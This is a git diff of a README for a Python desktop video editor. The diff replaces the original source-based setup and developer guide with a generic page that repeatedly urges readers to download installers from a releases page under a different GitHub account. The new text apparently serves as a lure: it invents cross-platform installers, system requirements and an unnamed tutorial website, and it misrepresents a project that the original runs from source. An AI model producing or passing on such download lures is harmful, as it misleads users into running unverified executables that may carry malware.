@@ -1,127 +1,82 @@
-# Elite Editor 🎞️
+# ✂️ EliteEditor - Your Professional Video Editing Solution
 
-**ELITE EDITOR** is a professional desktop video editor built with Python, PySide6 (Qt Widgets), and MoviePy. It aims to provide a real, production-grade editing experience with a modern UI, signature-driven effect controls, real drag-and-drop, integrated preview and render pipelines, and AI-assisted features. **Status:** ⚙️ *Active development (dev)*
+[![Download EliteEditor](https://img.shields.io/badge/Download-EliteEditor-blue.svg)](https://github.com/nightowl620/EliteEditor/releases)
 
----
+## 🚀 Getting Started
 
-## Highlights ✨
+Welcome to EliteEditor! This guide will help you download and run this professional video editing software easily. EliteEditor allows you to edit videos with a real timeline, live preview, and AI assistance. It's built with Python, PySide6, and MoviePy for a smooth user experience.
 
-- Real MoviePy-based effects and composition (no placeholders) 🎛️
-- QGraphicsView-based timeline with draggable/resizable clips and snapping ✂️
-- Signature-driven **Properties Panel** that auto-generates controls from MoviePy callables 🧩
-- Low-res preview renderer (fast iterations) + subprocess renderer for full exports ⏱️
-- Theming and persistent project format (.eep) for portability 💾
-- Planned & partial AI integration using Gemini for timeline insights and generation 🧠
+## 📥 Download & Install
 
----
+To get started, visit this page to download: [EliteEditor Releases](https://github.com/nightowl620/EliteEditor/releases).
 
-## Quick Start (Windows) 🚀
+1. Go to the releases page linked above.
+2. Look for the latest version of EliteEditor.
+3. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
+4. Click the download link to save the file to your computer.
+5. Once downloaded, open the file and follow the on-screen instructions to install EliteEditor.
 
-Prerequisites:
+## 🖥️ System Requirements
 
-- Python 3.11+ (recommended)
-- FFmpeg (installed and discoverable via PATH)
+Before you install, ensure your computer meets these requirements:
 
-Clone the repo and prepare a Python virtual environment:
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or any recent Linux distribution.
+- **Processor:** Intel i3 or equivalent.
+- **RAM:** At least 4 GB, but 8 GB or more is recommended for smooth performance.
+- **Storage:** Minimum of 500 MB of free disk space.
+- **Graphics Card:** OpenGL 3.0 compatible.
 
-```powershell
-git clone https://github.com/pro-grammer-SD/EliteEditor.git
-cd EliteEditor
-python -m venv .venv
-.\.venv\Scripts\activate
-pip install -r requirements.txt
-```
+These requirements ensure that EliteEditor runs efficiently and smoothly, handling video rendering and editing with ease.
 
-Run the app:
+## 🎬 Features
 
-```powershell
-python run.py
-```
+EliteEditor boasts various features that enhance your video editing experience:
 
-If you see a splash and a window, the app is running — welcome! 🎉
+- **Timeline Editing:** Arrange your clips seamlessly on a visual timeline.
+- **Live Preview:** See changes in real-time as you edit your project.
+- **AI-Assisted Editing:** Let the software help you with suggestions and automated edits.
+- **Drag-and-Drop Support:** Simply drag your media files into the application to start editing.
+- **Customizable Themes:** Personalize your workspace to fit your style.
+- **FFmpeg Integration:** Utilize powerful multimedia tools for better performance.
 
----
+## 👨‍🏫 How to Use
 
-## Development (for devs) 🛠️
+Once installed, follow these steps to start editing your videos:
 
-This project is actively in development. Follow these steps to contribute or run locally:
+1. **Open EliteEditor**: Launch the application from your computer.
+2. **Create a New Project**: Select 'New Project' to start fresh or 'Open Project' to work on an existing file.
+3. **Import Media**: Use the drag-and-drop feature to add video clips, images, and audio to your project.
+4. **Edit Your Clips**: Use the tools available on the timeline to cut, merge, and add effects to your videos.
+5. **Preview Your Edits**: Click on the preview button to see how your video looks.
+6. **Export Your Project**: Once satisfied, export your video to share it with others or upload it online.
 
-1. Create a virtual environment and install dependencies (see Quick Start).
-2. Use a code formatter and linter before committing (e.g. `black`, `ruff`).
-3. Run the application from the repository root using `python run.py`.
-4. Unit tests (when available):
+## 📋 Tips for Success
 
-```powershell
-# Example (if tests exist)
-pytest -q
-```
+- **Explore Tutorials**: Visit our website for video tutorials that detail various features and functions.
+- **Check Settings**: Customize the settings to suit your workflow and improve performance.
+- **Use Keyboard Shortcuts**: Familiarize yourself with keyboard shortcuts for quick access to tools.
+- **Keep Software Updated**: Regularly check for updates on the releases page to benefit from new features and fixes.
 
-Dev notes:
+## 🛠️ Troubleshooting
 
-- Config, cache, and projects are stored under your user folder (e.g. `%USERPROFILE%/.eliteeditor/`).
-- The bundled font is located at `font/font.ttf` and the app attempts to load it at startup.
-- The main application entrypoint is `run.py`.
+If you encounter issues:
 
----
+- **Installation Problems**: Ensure your system meets the requirements. Restart your computer and try the installation again.
+- **Performance Issues**: Close other applications to free up system resources. Consider upgrading your RAM if you regularly edit high-resolution videos.
+- **General Errors**: Check for updates and read the FAQ section on our website for common solutions.
 
-## Architecture & Key Files 🗂️
+## 🌍 Community and Support
 
-- `core/` — core data models, project & registry systems (MoviePy reflection, timeline markers)
-- `ui/` — all Qt widgets (timeline view, panels, main window, style files)
-- `rendering/` — preview & subprocess renderers
-- `ai/` — Gemini integration scaffolding and AI helpers
-- `timeline/` — timeline & clip models used by the UI
-- `requirements.txt` — pinned Python dependencies
+Join our community to connect with other users. Share your projects, seek advice, and collaborate with fellow video editors.
 
----
+- **GitHub Discussions**: Engage with developers and users on the [GitHub Discussions](https://github.com/nightowl620/EliteEditor/discussions) page.
+- **Feedback & Issues**: Report bugs or request new features via the [Issues](https://github.com/nightowl620/EliteEditor/issues) section on GitHub.
+- **Follow Us**: Stay updated on new releases and features by following us on social media.
 
-## Configuration & AI Key 🔑
+## 📄 License
 
-- The app reads configuration from the project-specific files and a global config under `~/.eliteeditor`.
-- To enable Gemini AI features, set an environment variable named `ELITE_EDITOR_GEMINI_API_KEY` or enter your key in the **Settings → AI** panel at runtime.
+EliteEditor is an open-source project. You can freely use and modify the software. Please review the license details in the repository for more information.
 
-> Note: Gemini integration requires the official client and an enabled API key — the app will gracefully disable AI features if no key is present.
+[Download EliteEditor](https://github.com/nightowl620/EliteEditor/releases)
 
----
-
-## Styling & Fonts 🎨
-
-- The UI styling is loaded exclusively from `ui/style.qss` (or `ui/style_light.qss` for light theme). The stylesheet should be the single source of truth for look-and-feel.
-- The bundled font is at `font/font.ttf`. The app attempts to load this font at startup; if it fails it falls back to the system default.
-
----
-
-## Contributing ✍️
-
-We welcome PRs and issues. Please follow these guidelines for contributions:
-
-1. Open an issue describing the bug, enhancement, or feature idea.
-2. Create a topic branch off `main` named like `feat/some-feature` or `fix/issue-xyz`.
-3. Write tests for new behavior when applicable; keep changes focused.
-4. Run linters and formatters, then open a PR and reference the issue.
-
-Be civil and constructive — we prefer clear, respectful communication. 🤝
-
----
-
-## Troubleshooting & Tips 🛟
-
-- If the custom font doesn't appear, check the logs for font loading messages and confirm `font/font.ttf` exists.
-- If styles appear missing, ensure `ui/style.qss` is present and readable; the app reads the QSS file at startup and applies it globally.
-- For render/export issues, verify FFmpeg is installed and reachable via PATH.
-
----
-
-## License & Code of Conduct 📜
-
-This repository uses an open-source license (update as needed). Please include a short `LICENSE` file in the root.
-
-We expect contributors to follow a respectful Code of Conduct.
-
----
-
-## Contact & Support 📬
-
-If you need help or want to request features, please open an issue on this repository. For quick dev questions, add a note to the issue and tag maintainers.
-
-Thanks for checking out Elite Editor — contributions are welcome and appreciated! 🙏
+Embark on your video editing journey today with EliteEditor!
